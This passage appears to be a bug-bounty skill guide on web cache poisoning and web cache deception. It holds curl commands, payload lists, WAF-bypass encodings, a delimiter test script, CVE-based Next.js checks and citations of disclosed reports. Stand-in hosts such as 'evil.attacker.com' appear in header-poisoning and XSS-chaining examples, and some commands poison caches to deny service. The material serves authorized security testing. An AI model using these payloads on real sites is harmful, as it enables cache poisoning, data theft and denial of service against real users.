   - Oversized headers that trigger backend errors

6. **Confirm unkeyed parameter poisoning.** Try query parameter fatigue or HTTP parameter pollution:
   - `GET /page?utm_source="><script>alert(1)</script>`
   Check if the param is reflected and cached for clean requests to `/page`.

7. **Validate cache storage.** After sending a potentially poisoned request, immediately request the same URL WITHOUT the malicious header from a different IP or incognito session. If you receive the poisoned response — it's confirmed.

8. **Measure cache TTL.** Check `Cache-Control: max-age` and `Age` to understand how long the poison persists and whether it's exploitable before expiry.

9. **Check affiliate/link flows specifically.** For platforms like Linkpop, test whether the referrer/product URL is embedded in a cacheable response that another user will receive.

10. **Document blast radius.** Determine: global CDN edge (worldwide), regional cache, or single-server cache. This directly affects severity rating.

---

## Payload & Detection Patterns

**Confirm caching behavior:**
```bash
# Send twice, compare Age header
curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
```

**Test unkeyed X-Forwarded-Host:**
```bash
curl -s -H "X-Forwarded-Host: evil.attacker.com" \
  "https://target.com/page" | grep -i "evil.attacker.com"
```

**Test Web Cache Deception (path appending):**
```bash
# Authenticated session cookie required
curl -s -b "session=YOUR_SESSION" \
  "https://target.com/account/profile.css"

# Then fetch without auth from another client
curl -s "https://target.com/account/profile.css"
```

**Force cache miss to test poison without hitting cached version:**
```bash
# Use a unique cache-busting query param to land on a fresh key — do NOT rely on
# client-sent "Cache-Control: no-cache" (per RFC 7234 it requests revalidation, not
# skip-storage, and Cloudflare/Fastly/Akamai generally ignore it on cacheable assets).
curl -s -H "X-Forwarded-Host: canary.attacker.com" \
     "https://target.com/page?cb=$RANDOM"
```

**DoS via poisoned error response:**
```bash
curl -s -H "X-Forwarded-Host: aaaaaaaaaaa.invalid" \
  "https://target.com/js/app.js" -I
# Check if next clean request returns error
curl -s -I "https://target.com/js/app.js" | grep "HTTP/"
```

**Grep patterns in Burp/ZAP response history:**
```
# Headers indicating cache hit
X-Cache: HIT
CF-Cache-Status: HIT
Age: [1-9]

# Reflected unkeyed input in body
evil\.attacker\.com
canary\d+\.

# Web cache deception indicators
Content-Type: text/css  (but response is HTML/JSON)
Cache-Control: public.*max-age  (on authenticated endpoint)
```

**Parameter pollution test:**
```bash
curl -s "https://target.com/page?cb=1&param=CANARY_VALUE" | grep CANARY_VALUE
# Then check if clean request returns poisoned version
curl -s "https://target.com/page?cb=1"
```

**Burp Suite Intruder wordlist for unkeyed headers:**
```
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
X-Original-URL
X-Rewrite-URL
X-Forwarded-Scheme
X-Forwarded-Proto
True-Client-IP
```

---

### Origin header → ACAO cache poisoning
Add `Origin` to the unkeyed-header set. Test whether it is reflected into `Access-Control-Allow-Origin` and then cached: `curl -H "Origin: evil.example" URL -I` on two consecutive hits. A cached attacker/`*` ACAO breaks CORS for legit users (cache-DoS); a cached permissive ACAO enables cross-user data reads. Disclosed: reports/591302.

## Common Root Causes

1. **CDN misconfiguration — caching based on URL path only.** Engineers configure cache rules like "cache everything matching `*.js`" without realizing the path can be appended to dynamic routes. The origin server ignores the extra path segments, but the CDN uses them as cache keys.

2. **Unkeyed header forwarding.** Developers configure reverse proxies to forward `X-Forwarded-Host` to backends for URL generation (canonical links, redirects, password reset emails) without including it in the cache key. The CDN caches the poisoned response.

3. **Web Cache Deception via permissive routing.** Frameworks that normalize URLs (e.g., Rails, Express) accept `/account/settings.css` and serve the same response as `/account/settings`. The CDN sees a `.css` extension and applies aggressive caching rules.

4. **Shared caching of multi-tenant responses.** SaaS platforms that use a single CDN without tenant isolation in the cache key allow cross-tenant cache poisoning.

5. **Error responses cached without thought.** Backend errors (404, 500) triggered by attacker-controlled input get cached, causing DoS for legitimate users. Developers implement caching without excluding error status codes.

6. **Lazy `Vary` header implementation.** Developers know they should add `Vary: X-Forwarded-Host` but forget, or CDNs strip/ignore `Vary` headers entirely (Cloudflare historically strips Vary on some asset types).

7. **Third-party integrations with URL reflection.** Affiliate/link tracking systems (like Shopify Linkpop) reflect the destination URL in metadata, canonical tags, or redirects — and these get cached globally.

---

## Bypass Techniques

**Defense: WAF blocking known poison headers**
- Bypass: Use less-common header variants: `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded: host=evil.com`, `X-Original-URL`
- Bypass: Header value encoding: `X-Forwarded-Host: evil%2ecom`
- Bypass: Case variation: `x-forwarded-host`, `X-FORWARDED-HOST`

**Defense: Stripping attacker-supplied headers at edge**
- Bypass: Use HTTP/2 pseudo-header manipulation if the proxy downgrades to HTTP/1.1
- Bypass: Inject via HTTP Request Smuggling — smuggle a request with poison headers past the WAF to hit the cache server directly

**Defense: Require authentication before caching**
- Bypass: Web Cache Deception — trick the cache into storing authenticated content by appending `.css`/`.js` to the URL, which matches a cache rule that ignores auth

**Defense: Cache key includes full URL with query string**
- Bypass: HTTP Parameter Pollution — some parsers take the first occurrence, caches key on full string; inject `?legit=1&param=evil` and cache stores it under `?legit=1&param=evil` but victim visits `?legit=1`
- Bypass: Fat GET request — send body parameters that the backend processes but the cache ignores

**Defense: Short TTL / rapid cache purging**
- Bypass: Automate re-poisoning; send the poison request in a loop just ahead of TTL expiry
- Bypass: Target CDN nodes with longer default TTLs by routing requests through specific PoPs

**Defense: `Cache-Control: private` on sensitive endpoints**
- Bypass: Check if CDN respects this header (some CDNs ignore it if an admin has overridden cache rules globally)
- Bypass: Find adjacent cacheable endpoints that reflect the same sensitive data

---

## Gate 0 Validation

1. **What can the attacker DO right now?**
   The attacker must be able to poison a cache entry and then demonstrate that a *separate, unauthenticated request* from a different client/IP receives the poisoned response — not just their own browser. If only the attacker sees the effect, it's not cache poisoning.

2. **What does the victim LOSE?**
   Must be one of: (a) session/account compromise via reflected credentials in poisoned response, (b) execution of attacker-controlled JS via poisoned asset, (c) service denial where legitimate requests return error responses, or (d) sensitive data disclosure (account details cached and served to other users). "Weird response headers" alone is not impact.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: send the poisoning request → wait for cache store → fetch the URL from incognito/different IP → observe poisoned response. If you can't demonstrate this clean reproduction with a second client, the cache may not actually be storing the poison and the report isn't ready.

---

## Real Impact Examples

**Scenario 1 — Mass DoS on CDN Asset Delivery (Shopify CDN)**
An attacker identified that CDN-served JavaScript assets on `cdn.shopify.com` could be poisoned by sending a request with a crafted header that caused the origin to return a 4xx error. The CDN cached this error response. Any merchant storefront loading that asset then received the cached error instead of the valid JS file — breaking checkout flows and storefront functionality across all stores sharing that CDN path. One HTTP request, global merchant impact, persisting until cache TTL expired.

**Scenario 2 — Account Takeover via Web Cache Deception**
On a platform serving authenticated account pages, an attacker crafted a URL like `/account/profile/photo.jpg` and sent it to a victim (via phishing link). When the victim (authenticated) visited the URL, the server responded with their full account profile page (name, email, session tokens). Because the URL ended in `.jpg`, the CDN cached the authenticated response publicly. The attacker then fetched `/account/profile/photo.jpg` without authentication and received the victim's account data — enabling full account takeover. Impact was amplified because the cache served the same response to any subsequent requester.

**Scenario 3 — Affiliate Link Hijacking via URL Path Manipulation (Shopify Linkpop)**
An attacker discovered that the Linkpop affiliate link service would cache responses based on URL path but reflected a manipulated product destination URL in the cached HTML. By visiting a specially crafted path before legitimate users, the attacker poisoned the cache to redirect affiliate clicks to an attacker-controlled domain instead of the legitimate Amazon product. Victims clicking what appeared to be valid merchant links were sent to attacker infrastructure, enabling credential phishing and loss of affiliate commission revenue for the legitimate merchant.

---

## Disclosed Report Citations (2017-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Spans the two major families: cache **poisoning** (attacker influences a cached response served to victims) and cache **deception** (attacker tricks the cache into storing a victim's private response).

1. **Shopify — Cache poisoning via X-Forwarded-Host** ([H1 #977851](https://hackerone.com/reports/977851))
    - Subclass: X-Forwarded-Host header poisoning (unkeyed input → redirect/script-src corruption)
    - Payload: `GET /any-path` with `X-Forwarded-Host: attacker.com` — single request persisted attacker host in cached response across `apps.shopify.com` and localized subdomains
    - Root cause: X-Forwarded-Host influenced asset/redirect URL generation but was NOT part of the cache key
    - Year: 2020 — **$1,300 → escalated to $6,300** (one-shot poison, multi-host blast radius)

2. **HackerOne — Cache poisoning DoS via X-Forwarded-Port** ([H1 #409370](https://hackerone.com/reports/409370))
    - Subclass: X-Forwarded-Host / X-Forwarded-Port DoS (poisoned redirect to invalid port)
    - Payload: `GET /<redirect-path>` with `X-Forwarded-Port: 1` — cached 301 redirect pointed legitimate users at port 1, breaking access
    - Root cause: trusted X-Forwarded-* headers in 301 redirect generation; cache stored the bad Location
    - Year: 2018 — **$2,500** (foundational H1-on-H1 case)

3. **GitLab — Cache poisoning DoS via X-HTTP-Method-Override** ([H1 #1160407](https://hackerone.com/reports/1160407))
    - Subclass: method-cloaking / GCS cache-key bleed (HEAD response stored under GET key)
    - Payload: `GET /assets/webpack/*.js` with `X-HTTP-Method-Override: HEAD` — GCS backend honored the override and returned an empty body; CDN cached it as the canonical GET response
    - Root cause: CDN cache not method-aware; HEAD body (empty) overwrote GET entry for cached static assets
    - Year: 2021 — **$2,500** (DoS normally OOS, paid for novelty)

4. **PayPal — Web Cache Deception (Omer Gil original)** ([Blog](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html))
    - Subclass: classic WCD via `.css`/`.jpg`/etc. path appending on authenticated routes
    - Payload: `GET https://www.paypal.com/myaccount/home/foo.css` — origin served full authenticated account page; CDN cached it as "static .css" for ~5 hours
    - Root cause: origin routed unknown path suffixes to the parent dynamic handler; CDN cached based purely on the static-looking file extension
    - Year: 2017 — **$3,000** (PortSwigger Top-10 Web Hacking Technique of 2017, #2)

5. **Cloudflare PBB — Cache Deception Armor bypass via `.avif`** ([H1 #1391635](https://hackerone.com/reports/1391635))
    - Subclass: CDN-specific allowlist bypass (Cloudflare's WCD protection feature) using an obscure image extension
    - Payload: `GET https://<protected-origin>/account/me.avif` — Cloudflare's Cache Deception Armor extension list omitted `.avif`, so the authenticated HTML response was cached
    - Root cause: Cache Deception Armor used a static, incomplete extension allowlist that did not cover modern image MIME types
    - Year: 2022 — Cloudflare PBB bounty (amount undisclosed)

6. **Akamai (PayPal/Airbnb/Goldman Sachs) — Hop-by-hop header smuggling → server-side edge poisoning** ([Tediosi & Mariani writeup](https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b))
    - Subclass: CDN-specific request-smuggling that lands attacker responses in Akamai's edge cache for nearby IPs
    - Payload: `Connection: Content-Length` + crafted request — Akamai's first proxy stripped Content-Length as hop-by-hop, second proxy treated body as a second request whose response was cached at the edge
    - Root cause: inconsistent handling of hop-by-hop headers across Akamai proxy tiers caused desync; smuggled responses were server-side cached globally
    - Year: 2022 — **>$50K total** across affected programs (PayPal $25,200 + Airbnb $14,875 + Goldman Sachs $100), PortSwigger Top-10 Web Hacking Techniques 2022 nominee

7. **James Kettle (PortSwigger) — "Gotta cache 'em all": path-normalization & WCD against Cloudflare/Fastly/GCP** ([PortSwigger Research](https://portswigger.net/research/gotta-cache-em-all))
    - Subclass: cache-key path normalization discrepancies and Web Cache Deception across major CDNs (Cloudflare, Fastly, GCP/Google Cloud) — the 2024 research named in this skill's description
    - Payload: origin-vs-cache delimiter/normalization disagreements (e.g. encoded path segments and static-suffix tricks) that cause the cache to store a dynamic/authenticated response under a static-looking key
    - Root cause: cache and origin disagree on how to normalize/parse the URL path, so the cache key does not match the resource the origin actually served
    - Year: 2024 — coordinated CDN-vendor disclosure; methodology research (no single bounty), PortSwigger Top-10 Web Hacking Techniques 2024 entry

---

## Related Skills & Chains

- **`hunt-xss`** — Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
- **`hunt-http-smuggling`** — Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
- **`hunt-auth-bypass`** — Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
- **`security-arsenal`** — Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the poisoned response MUST be reproducible from a separate IP/incognito without your poison headers. If only your own browser sees the effect, it's a self-cache and N/A.



---

## web-cache-deception

# Web Cache Deception Testing

## Overview

Web Cache Deception (WCD) occurs when a CDN or reverse-proxy cache stores a response that contains user-specific private data, making that data available to any attacker who requests the same cached URL without authentication. The root cause is a discrepancy between how the CDN parses and caches URLs versus how the origin server routes them.

**Core mechanism**: The attacker crafts a URL that the CDN caches (based on file extension or directory prefix) while the origin server ignores the crafted suffix and serves the authenticated user's private data. The cached response is then served to the attacker without credentials.

**Safety constraints for all testing:**
- Never cause a real user to visit a deception URL (do not send emails, DMs, or embed lure links)
- Prime the cache only with an operator-controlled test account containing synthetic canary data
- Do not target endpoints containing real tokens, payment data, medical data, private files, or other users' PII
- Stop after controlled cross-session disclosure is proven; do not replay tokens or expand to account takeover unless separately authorized
- If two controlled identities, safe canary data, or cleanup/TTL information are unavailable, do not perform live deception testing

---

## Phase 0: Reconnaissance and Fingerprinting

### CDN Identification

```bash
curl -sI https://TARGET/ | grep -iE "server|x-cache|cf-ray|cf-cache|x-amz|x-served-by|x-akamai|via|x-cdn|x-fastly"
```

**CDN Signature Headers:**

| CDN | Identifying Headers |
|-----|-------------------|
| Cloudflare | `CF-Ray`, `CF-Cache-Status`, `Server: cloudflare` |
| Akamai | `X-Akamai-*`, `Server: AkamaiGHost`, `X-Cache-Key` (with Pragma debug) |
| Fastly | `X-Served-By: cache-*`, `X-Cache-Hits`, `Via: ... varnish` |
| CloudFront | `X-Amz-Cf-Pop`, `X-Amz-Cf-Id`, `X-Cache: Hit/Miss from cloudfront` |
| Azure CDN | `X-MSEdge-Ref`, `X-Azure-*` |
| Google Cloud CDN | `Via: ... google`, `X-Goog-*` |
| Nginx proxy_cache | `X-Cache-Status`, `X-Proxy-Cache` |
| Varnish | `X-Varnish`, `Via: ... varnish`, `Age` |

**Akamai debug headers:**
```bash
curl -sI -H "Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key" https://TARGET/
```

### CDN Normalization Camp Classification (Critical)

This determines which attack direction is viable.

**Non-Normalizing CDNs** (do NOT decode/resolve before cache rules):
- Cloudflare, Akamai (default), Fastly, Google Cloud CDN, Nginx proxy_cache, Varnish
- Directory traversal payloads (Family 3A) work: CDN caches `/static/..%2faccount` as a `/static/` prefix hit while origin resolves to `/account`

**Normalizing CDNs** (decode and resolve BEFORE applying cache rules):
- CloudFront, Azure CDN, Imperva
- Family 3A does NOT work; Direction 2 (Family 4A) works if origin has delimiter truncation

```bash
# Confirm normalization behavior
curl -sI "https://TARGET/static/..%2fstatic/known-file.css"
# Response matches /static/known-file.css → CDN normalizes
# 404 or different response → CDN does NOT normalize
```

### Framework Detection

```bash
# Spring/Java
curl -s https://TARGET/nonexistent-path-12345 | grep -i "whitelabel"
curl -sI https://TARGET/ | grep -i "jsessionid"
curl -sI https://TARGET/;test  # semicolon handling

# Rails
curl -s https://TARGET/ | grep -i "csrf-token\|authenticity_token\|turbolinks"
curl -sI "https://TARGET/test-page.json"  # dot format suffix

# Next.js
curl -s https://TARGET/ | grep -i "__NEXT_DATA__"
curl -s https://TARGET/ | grep -oP '"buildId":"[^"]*"'
curl -sI https://TARGET/_next/static/

# SvelteKit
curl -s https://TARGET/__data.json

# Nuxt
curl -s https://TARGET/_payload.json
curl -s https://TARGET/ | grep -i "__NUXT_DATA__"

# Django
curl -s https://TARGET/ | grep -i "csrfmiddlewaretoken"

# Express
curl -sI https://TARGET/ | grep -i "x-powered-by: Express"

# PHP
curl -sI https://TARGET/ | grep -i "x-powered-by: PHP"

# ASP.NET/IIS
curl -sI https://TARGET/ | grep -iE "x-powered-by.*asp|x-aspnet|set-cookie.*asp.net_sessionid"
```

---

## Phase 1: Cache Rule Mapping

### Extension-Based Cache Rule Discovery

**Cloudflare default cached extensions (56 total):**
```
.7z .avif .bin .bmp .bz2 .class .css .csv .doc .docx .ejs .eot .eps
.exe .flac .gif .gz .ico .jar .jpeg .jpg .js .mid .midi .mkv .mp3
.mp4 .ogg .otf .pdf .pict .pls .png .ppt .pptx .ps .rar .svg .svgz
.swf .tar .tif .tiff .ttf .webm .webp .woff .woff2 .xls .xlsx .zip
```

```bash
ID=$(openssl rand -hex 4)
for ext in css js png jpg gif ico svg woff2 avif map webmanifest json txt xml pdf; do
  echo "=== Testing .${ext} ==="
  curl -sI "https://TARGET/cache-test-${ID}.${ext}" | grep -iE "x-cache|cf-cache|age"
  sleep 0.5
  curl -sI "https://TARGET/cache-test-${ID}.${ext}" | grep -iE "x-cache|cf-cache|age"
done
```

### Directory-Based Cache Rule Discovery

```bash
ID=$(openssl rand -hex 4)
for dir in static assets public media images css js fonts uploads wp-content wp-includes _next/static build dist bundles resources _app/immutable; do
  echo "=== Testing /${dir}/ ==="
  curl -sI "https://TARGET/${dir}/test-${ID}.css" | grep -iE "x-cache|cf-cache|age|cache-control"
done
```

### Query String Cache Key Analysis

| CDN | Default | WCD Risk |
|-----|---------|-----------|
| Cloudflare | Includes all query strings | Low |
| Akamai | Configurable (default: include all) | Low |
| CloudFront | **Excludes all** (CachingOptimized policy) | **HIGH** |
| Fastly | Includes all | Low |
| Azure CDN | Configurable | Depends |
| Google Cloud CDN | Includes all | Low |

```bash
# Test if query string is in cache key
ID1=$(openssl rand -hex 4); ID2=$(openssl rand -hex 4)
curl -sI "https://TARGET/known-static.css?param=value-a-${ID1}" | grep -iE "x-cache|cf-cache"
curl -sI "https://TARGET/known-static.css?param=value-b-${ID2}" | grep -iE "x-cache|cf-cache"
# Second is HIT after first was MISS → query NOT in cache key
```

### Cache Deception Armor (CDA) Check (Cloudflare)

```bash
curl -sI "https://TARGET/known-dynamic-page.css" | grep -i "cf-cache-status"
# CF-Cache-Status: BYPASS → CDA active
# CF-Cache-Status: MISS/HIT → CDA not active or not triggered
```

**CDA Known Gaps:**
- `.avif` bypass reported (HackerOne #1391635)
- `.js` returning `application/json` Content-Type may not trigger CDA
- CDA is OFF by default
- CDA does NOT protect against directory-based attacks (Families 3/4)

---

## Phase 2: Delimiter Differential Testing

A delimiter differential exists when the origin truncates a URL at a character but the cache does not. This is the core mechanism enabling most WCD attacks.

**Baseline method:**
```bash
BASELINE=$(curl -s -H "Cookie: session=YOUR_SESSION" "https://TARGET/ENDPOINT" | md5sum | cut -d' ' -f1)
# Append delimiter+garbage, compare md5 to baseline
# MATCH = origin truncates at that delimiter
```

### Delimiter Reference Matrix

| Delimiter | Raw | Encoded | Frameworks That Truncate | Cache Treatment |
|-----------|-----|---------|------------------------|----------------|
| Semicolon | `;` | `%3B` | Spring, Tomcat, Jetty, WildFly | Part of path (all CDNs) |
| Dot | `.` | `%2E` | Rails (format suffix) | Part of path (all CDNs) |
| Hash | `#` | `%23` | Some Nginx configs | Part of path (all CDNs) |
| Question mark | `?` | `%3F` | Apache, IIS, Tomcat | Varies by CDN |
| Null byte | N/A | `%00` | OpenLiteSpeed, PHP < 5.3.4 | Part of path (all CDNs) |
| Newline | N/A | `%0A` | Nginx (prefix rewrite only) | Part of path (all CDNs) |
| Forward slash | `/` | `%2F` | Path traversal when decoded | Not decoded (most CDNs) |
| Backslash | `\` | `%5C` | IIS (treats as `/`) | Not converted (all CDNs) |

**Semicolon (Spring/Java) — most reliable:**
```bash
# Spring MVC/Tomcat treats ; as matrix variable delimiter; strips it for routing
curl -s -H "Cookie: session=YOUR_SESSION" "https://TARGET/ENDPOINT;testparam" | md5sum
# Match baseline → semicolon differential confirmed
```

Spring version behavior:
- Spring 4.x/5.x/Boot 2.x: semicolons stripped by default
- Spring Boot 3.x/PathPatternParser: semicolons still stripped from routing path

**Dot (Rails format suffix):**
```bash
curl -s -H "Cookie: session=ACCOUNT_A" "https://TARGET/ENDPOINT.css" | md5sum
# Match baseline AND Content-Type is text/html → Rails format differential
# SKIP .json — if Rails returns JSON for /account.json, that is content negotiation, NOT WCD
```

**Backslash (IIS — universal differential):**
```bash
curl -s -H "Cookie: session=ACCOUNT_A" "https://TARGET/ENDPOINT%5Ctestparam" | md5sum
# IIS treats \ as /, NO CDN does. Universal differential for IIS behind any CDN.
```

**Complete delimiter test script:**
```bash
#!/bin/bash
TARGET="https://TARGET"; ENDPOINT="/account"; COOKIE="session=ACCOUNT_A_SESSION"
BASELINE=$(curl -s -H "Cookie: $COOKIE" "${TARGET}${ENDPOINT}" | md5sum | cut -d' ' -f1)
echo "Baseline: $BASELINE"

for name in "semicolon:;" "enc_semi:%3B" "enc_hash:%23" "null:%00" "newline:%0A" "backslash:%5C" "enc_qmark:%3F" "dbl_enc:%253B"; do
  DELIM=$(echo "$name" | cut -d: -f2)
  RESULT=$(curl -s -H "Cookie: $COOKIE" "${TARGET}${ENDPOINT}${DELIM}testparam" | md5sum | cut -d' ' -f1)
  [ "$RESULT" == "$BASELINE" ] && echo "${name}: MATCH - DIFFERENTIAL EXISTS" || echo "${name}: NO MATCH"
done
```

---

## Phase 3: Path Normalization Testing

### Direction 1: Origin Normalizes, Cache Does NOT (Most Common)

**Applicable:** Non-normalizing CDNs (Cloudflare, Akamai, Fastly, GCP, Nginx, Varnish) + origin that decodes %2f and resolves dot-segments (Nginx, Apache, IIS, Tomcat).

```bash
# Test: origin decodes %2f and resolves ..
curl -s -H "Cookie: session=ACCOUNT_A" "https://TARGET/anypath/..%2fENDPOINT" | md5sum
# Match baseline → Direction 1 viable

# Attack payload:
# /static/..%2faccount → CDN sees /static/ (caches), origin resolves to /account
```

### Direction 2: Cache Normalizes, Origin Does NOT

**Applicable:** Normalizing CDNs (CloudFront, Azure CDN, Imperva) + origin that does NOT decode %2f (Express.js, Next.js, Flask, FastAPI) + delimiter truncation on origin.

```bash
# Attack payload:
# /account;%2f%2e%2e%2fstatic/any
# CloudFront: decodes %2f%2e%2e%2f → /../, resolves → /static/any (caches)
# Origin (Spring): truncates at ; → routes to /account (serves private data)
```

### Traversal Depth Calculation

| Cached Prefix | Depth from Root | Required Traversal |
|--------------|----------------|-------------------|
| `/static/` | 1 | `..%2f` |
| `/assets/` | 1 | `..%2f` |
| `/_next/static/` | 2 | `..%2f..%2f` |
| `/wp-content/uploads/` | 3 | `..%2f..%2f..%2f` |
| `/sites/default/files/` | 3 | `..%2f..%2f..%2f` |

### Encoding Variants for WAF Bypass

```
..%2f          → standard
%2e%2e%2f      → fully encoded dot-dot-slash
..%2F          → uppercase hex
..%252f        → double-encoded (WAF bypass)
%c0%af         → overlong UTF-8 slash (some legacy servers)
..%5c          → backslash (IIS only)
```

---

## Phase 4: Payload Construction

### Family 1A: Delimiter + Static Extension Suffix

**Pattern:** `/<sensitive-endpoint><DELIMITER><random>.<cached-extension>`

```bash
WCD_ID=$(openssl rand -hex 8)

# Semicolon (Spring/Tomcat/Jetty)
/account;${WCD_ID}.css
/account;jsessionid=${WCD_ID}.css

# Dot (Rails format suffix)
/account.css
/account.ico
/account.avif
# Skip .json — may trigger content negotiation

# Encoded hash
/account%23${WCD_ID}.css

# Null byte (OpenLiteSpeed)
/account%00${WCD_ID}.css

# Backslash (IIS)
/account%5C${WCD_ID}.css
```

**Extension priority order:**
1. `.css` — universally cached, clear WCD indicator
2. `.js` — cached (CDA may pass if Content-Type is application/json)
3. `.ico` — universally cached, rarely served by dynamic endpoints
4. `.avif` — CDA bypass reported (HackerOne #1391635)
5. `.woff2` — cached, uncommon in WAF rules
6. `.map` — source map, often overlooked
7. `.webmanifest` — PWA manifest, often cached
8. `.svg`, `.png`, `.jpg`, `.gif` — widely cached

### Family 1B: Path Confusion (No Delimiter)

**Pattern:** `/<sensitive-endpoint>/<random>.<cached-extension>`

Applicable when origin ignores trailing path segments (Next.js catch-all routes, Express wildcards, PHP PATH_INFO, Django `re_path` with `.*`).

```bash
/account/${WCD_ID}.css
/account/sub/${WCD_ID}.css
/account/static/${WCD_ID}.css
```

### Family 3A: Directory Traversal — Direction 1

**Pattern:** `/<cached-dir>/..%2f<sensitive-endpoint>`

```bash
# Single depth
/static/..%2faccount
/assets/..%2faccount

# Double depth
/_next/static/..%2f..%2faccount

# Triple depth
/wp-content/uploads/..%2f..%2f..%2faccount

# Combined with extension for double cache rule match
/static/..%2faccount;${WCD_ID}.css

# WAF bypass variants
/static/%2e%2e%2faccount        # fully encoded
/static/..%252faccount          # double encoded
/static/..%5caccount            # backslash (IIS)
```

**Cloudflare CDA bypass:** Directory-based attacks are NOT blocked by CDA. If `/account;wcd.css` returns `CF-Cache-Status: BYPASS`, use `/static/..%2faccount` instead.

### Family 4A: Directory Traversal — Direction 2

**Pattern:** `/<sensitive-endpoint><DELIMITER>%2f%2e%2e%2f<cached-dir>/any`

```bash
# CloudFront/Azure CDN + Spring origin
/account;%2f%2e%2e%2fstatic/any.css
# CloudFront decodes → /static/any.css (caches); origin truncates at ; → /account

# Depth from endpoint to static dir matters
# /api/v1/user (depth 3) → /static/ (depth 1):
/api/v1/user;%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fstatic/any.css
```

### Family 5A: File-Name-Based Cache Rules

```bash
# Commonly cached file names
/account;${WCD_ID}/robots.txt
/account/${WCD_ID}/robots.txt
/account%23${WCD_ID}/favicon.ico
```

### Family 7A: Query String Exclusion (CloudFront)

CloudFront's `CachingOptimized` policy excludes ALL query strings by default. `/account;wcd.css?r=attacker_random` and `/account;wcd.css` share the same cache key.

```bash
# Test for exclusion
ID1=$(openssl rand -hex 4); ID2=$(openssl rand -hex 4)
curl -sI "https://TARGET/test.css?q=${ID1}" > /dev/null
curl -sI "https://TARGET/test.css?q=${ID2}" | grep -iE "x-cache|cf-cache"
# HIT → query excluded from cache key
```

### Family 8A: GraphQL GET Endpoint

```bash
# If CDN excludes query from cache key AND GraphQL supports GET:
QUERY='query{viewer{id,email,name,phone}}'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$QUERY'))")
curl -s -H "Cookie: session=ACCOUNT_A" "https://TARGET/graphql?query=${ENCODED}"
# Cache key = /graphql (no query); authenticated response cached for all
```

### Family 9A: Next.js Data Routes

```bash
# Extract buildId
BUILD_ID=$(curl -s "https://TARGET/" | grep -oP '"buildId":"([^"]*)"' | head -1 | cut -d'"' -f4)

# Data routes (/_next/ is commonly cached)
/_next/data/${BUILD_ID}/account.json
/_next/data/${BUILD_ID}/profile.json
/_next/data/${BUILD_ID}/dashboard.json
/_next/data/${BUILD_ID}/settings.json
```

### Family 9B: SvelteKit Data Routes

```bash
/account/__data.json
/profile/__data.json
/settings/__data.json
```

### Family 9C: Nuxt Payload Routes

```bash
/account/_payload.json
/profile/_payload.json
/settings/_payload.json
```

---

## Phase 5: Framework-Specific Attacks

### Next.js

**Attack 1: __NEXT_DATA__ Cache Deception**

Every Pages Router page embeds ALL `getServerSideProps` data in `<script id="__NEXT_DATA__">`. Caching the HTML via WCD exposes the full user object, CSRF tokens, and session data.

**CVE-2025-29927 — Middleware Bypass (< 14.2.25 and < 15.2.3):**
```bash
# Bypass ALL middleware including auth and Cache-Control enforcement
curl -sI -H "x-middleware-subrequest: middleware" "https://TARGET/admin/dashboard"
# If 200 while normal returns 302/401 → middleware bypass active
# Without middleware: Cache-Control: no-store (not cached)
# With bypass: NO Cache-Control → CDN caches it

# Test other path values
for path in middleware src/middleware pages/_middleware app/middleware; do
  curl -sI -H "x-middleware-subrequest: ${path}" "https://TARGET/account" | head -3
done
# Multiple colons: middleware:middleware:middleware:middleware:middleware
```

**CVE-2024-46982 — Stale Elixir (>=13.5.1 <13.5.7 and >=14.0.0 <14.2.10):**
```bash
curl -sI -H "Cookie: session=ACCOUNT_A" "https://TARGET/account?__nextDataReq=1" -H "x-now-route-matches: 1"
# If Cache-Control: s-maxage=31536000, stale-while-revalidate → CDN caches for 1 year
```

**Avoid `.json`** extension on Next.js — it may trigger data route handler instead of WCD.

### Spring / Java (Tomcat, Jetty, WildFly)

**Semicolon matrix variable exploitation:**

```bash
# Verify truncation
curl -s -H "Cookie: session=ACCOUNT_A" "https://TARGET/account;anything" | md5sum
# Match baseline → confirmed

# Payloads
/account;${WCD_ID}.css
/account;jsessionid=${WCD_ID}.css
/account;color=red/${WCD_ID}.css

# Deeper paths
/api/user/profile;${WCD_ID}.css
/api/user;a/profile;${WCD_ID}.css

# Actuator endpoints (sensitive if exposed)
/actuator/env;${WCD_ID}.css
/actuator/configprops;${WCD_ID}.css
```

### Rails / Ruby

**Dot extension format suffix:**

```bash
# /account.css tells Rails "render /account in CSS format"
# No CSS template → falls back to HTML → serves full page
curl -sI -H "Cookie: _session_id=ACCOUNT_A" "https://TARGET/account.css" | grep "content-type"
# text/html despite .css URL → differential confirmed

# Extensions that trigger HTML fallback (safe to use)
for ext in css ico map webmanifest avif woff2 svg; do
  curl -sI -H "Cookie: _session_id=ACCOUNT_A" "https://TARGET/account.${ext}"
done
